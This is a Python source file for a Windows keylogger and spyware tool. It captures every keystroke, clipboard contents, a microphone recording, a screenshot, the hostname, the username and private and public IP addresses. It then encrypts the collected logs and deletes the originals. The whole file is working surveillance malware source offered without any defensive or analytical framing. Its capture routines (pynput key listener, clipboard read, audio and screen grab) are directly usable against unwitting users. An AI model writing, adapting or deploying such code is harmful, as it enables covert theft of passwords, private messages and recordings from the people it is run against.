# System and network information libraries for system info and clipboard data
import os
import socket   # For getting the system's hostname and private IP address
import platform # For gathering OS and machine details
import win32clipboard  # For accessing clipboard contents on Windows

# Keylogger libraries for recording key presses
from pynput.keyboard import Key, Listener   # Pynput allows capturing keyboard events

# Audio recording libraries for microphone input
from scipy.io.wavfile import write  # For saving the audio recordings in WAV format
import sounddevice as sd            # For recording audio from the system microphone

# Encryption libraries to secure logs
from cryptography.fernet import Fernet  # For encrypting the log files

# Utilities for system information
import getpass   # For fetching the current user's username
from requests import get  # For getting public IP address from an external service
from PIL import ImageGrab  # For taking screenshots

# File names and paths for saving logs and recordings
key_info = "logs.txt"  # Log file for key presses
filepath = "C:\\Users\\moist_shrek458\\OneDrive\\Desktop\\files\\work_files\\cyber\\k3y70gg3R"  # Directory for saving files

# System and audio log file names
system_info = "sys_info.txt"  # File for storing system information
clipboard_info = "clipboard.txt"  # File for storing clipboard data
microphone_time = 10  # Duration in seconds for the audio recording
audio_info = "audio_info.wav"  # File for saving audio recordings
screenshot_info = "screenshot.png"  # File for saving screenshots

# Keylogger timing settings
time_iteration = 15  # Time interval between log entries
number_of_iterations_end = 3  # Total number of iterations for the logger

# Encrypted log file names
keys_info_encrypted = "encrypted_key_info.txt"  # Encrypted key logs
sys_info_encrypted = "encrypted_sys_info.txt"  # Encrypted system info
clipboard_info_encrypted = "encrypted_clipboard_info.txt"  # Encrypted clipboard data

# Encryption key for securing logs, generated via Fernet
encryption_key = b"Add an encryption key"

count = 0  # Counter for key press events
keys = []  # List to store key presses

# Function to gather system information and save it to a file
def comp_info():
    with open(os.path.join(filepath, system_info), "a") as file:  # Opens the system info file for appending
        hostname = socket.gethostname()  # Get the hostname of the system
        ip_addr = socket.gethostbyname(hostname)  # Get the private IP address
        try:
            public_ip_addr = get("https://api.ipify.org").text  # Fetch the public IP using an external service
            file.write(f"Public IP Address: {public_ip_addr}\n")  # Write the public IP to the file
        except Exception:
            file.write("Could not get the public IP.\n")  # If failed, log an error

        # Write processor, OS, machine details
        file.write(f"Processor: {platform.processor()}\n")
        file.write(f"System: {platform.system()} {platform.version()}\n")
        file.write(f"Machine: {platform.machine()}\n")
        file.write(f"Hostname: {hostname}\n")
        file.write(f"Username: {getpass.getuser()}\n")
        file.write(f"Private IP Address: {ip_addr}\n")

comp_info()

# Function to copy clipboard data and save it to a file
def copy_clipboard():
    with open(os.path.join(filepath, clipboard_info), "a") as file:  # Opens the clipboard log file
        try:
            win32clipboard.OpenClipboard()  # Access the clipboard
            pasted_data = win32clipboard.GetClipboardData()  # Get clipboard data
            win32clipboard.CloseClipboard()  # Close the clipboard
            file.write(f"Clipboard Data: \n{pasted_data}")  # Write the clipboard data to the file
        except Exception:
            file.write("Some error occurred while accessing the clipboard.\n")  # Log any errors

copy_clipboard()

# Function to record audio from the microphone and save it as a WAV file
def microphone_record():
    sampling_frequency = 44100  # Standard sampling frequency for audio recording
    # Record audio for a specified duration with two channels (stereo)
    recording = sd.rec(int(microphone_time * sampling_frequency), samplerate=sampling_frequency, channels=2)
    sd.wait()  # Wait for the recording to finish
    write(os.path.join(filepath, audio_info), sampling_frequency, recording)  # Save the recording as a WAV file

microphone_record()

# Function to take a screenshot and save it as an image
def screenshot():
    image = ImageGrab.grab()  # Capture the screen
    image.save(os.path.join(filepath, screenshot_info))  # Save the screenshot to a file

screenshot()

# Function to log key presses and write them to a file
def on_key_press(key):
    global keys, count

    keys.append(key)  # Append the key to the list of keys
    count += 1  # Increment keypress counter
    if count >= 1:  # Save the log after every key press
        count = 0
        write_log(keys)  # Write the collected keys to the log file
        keys = []  # Reset the key list

# Function to write key logs to a file
def write_log(keys):
    with open(os.path.join(filepath, key_info), "a") as file:  # Opens the log file for appending
        for key in keys:  # Iterate over the keys pressed
            if key == Key.space:
                file.write(" ")  # Write a space for the spacebar
            elif key == Key.enter:
                file.write("\n")  # Write a newline for the Enter key
            elif key == Key.tab:
                file.write("\t")  # Write a tab for the Tab key
            else:
                file.write(str(key).replace("'", ""))  # Log any other keypress and remove quotes

# Function to stop the listener when the Escape key is pressed
def on_key_release(key):
    if key == Key.esc:
        return False  # Stop the listener when the Esc key is pressed

# Listener for capturing keypress events
with Listener(on_press=on_key_press, on_release=on_key_release) as listener:
    listener.join()  # Start listening for keypress events

# Encrypt collected logs
non_encrypted_files = [key_info, system_info, clipboard_info]  # List of plaintext files
encrypted_files = [keys_info_encrypted, sys_info_encrypted, clipboard_info_encrypted]  # Corresponding encrypted filenames

# Encrypt each log file and save them as encrypted files
for i in range(len(non_encrypted_files)):
    with open(os.path.join(filepath, non_encrypted_files[i]), 'rb') as file:
        data = file.read()  # Read the file's contents
    encrypted_data = Fernet(encryption_key).encrypt(data)  # Encrypt the file data
    with open(os.path.join(filepath, encrypted_files[i]), 'wb') as file:
        file.write(encrypted_data)  # Write the encrypted data to a new file

# Clean up by removing the original unencrypted files
for file in non_encrypted_files + [screenshot_info, audio_info]:
    os.remove(os.path.join(filepath, file))  # Delete each file after encryption
 
